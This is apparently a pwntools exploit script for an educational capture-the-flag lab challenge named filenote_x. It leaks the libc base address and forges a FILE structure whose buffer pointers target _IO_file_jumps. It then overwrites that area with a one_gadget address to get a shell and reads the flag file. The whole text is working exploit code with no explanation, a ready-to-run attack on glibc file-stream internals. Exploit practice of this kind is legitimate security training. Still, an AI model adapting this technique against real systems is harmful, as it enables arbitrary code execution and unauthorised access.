from pwn import *
split = lambda v,sz: [v[i:i+sz] for i in range(0,len(v),sz)]

HOST, PORT = 'edu-ctf.zoolab.org', 30217
if args.HOST: HOST = args.HOST
if args.PORT: PORT = args.PORT

exe = context.binary = ELF('./lab3_release/filenote_x/chal')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.sym['one_gadget'] = 0xe6c81

if args.REMOTE:
    io = remote(HOST,PORT)
else:
    io = process(exe.path)
    pause()

libc.address = int(io.readline().split()[-1], 16) - libc.sym.printf
info(f'libc base: {hex(libc.address)}')
info(f'one_gadget: {hex(libc.sym.one_gadget)}')

io.sendlineafter(b'>', b'1')
# pause()

note_offset = 0x2a0
tmp_file_offset = 0x4b0
offset = tmp_file_offset - note_offset

st = 0
sz = 10

flags = 0
write_base = 0
write_ptr = 0
write_end = 0
read_ptr = 0
read_end = 0
read_base = 0
buf_base = libc.sym._IO_file_jumps + 0x8 * st
buf_end = buf_base + 0x8 * sz
fd = 0

payload = flat({
    offset: [
        flags, read_ptr,
        read_end, read_base,
        write_base, write_ptr,
        write_end, buf_base,
        buf_end, 0,
        0, 0,
        0, 0,
        fd,
    ],
})

io.sendlineafter(b'>', b'2')
io.sendlineafter(b'>', payload)

# pause()
io.sendlineafter(b'>', b'4')
io.sendline(p64(libc.sym.one_gadget)*sz)

if not args.REMOTE:
    io.interactive()
else:
    io.clean(1)
    io.sendline(b'cat /home/`whoami`/flag*')
    flag = io.readuntil(b'}').strip().decode()
    success(flag)
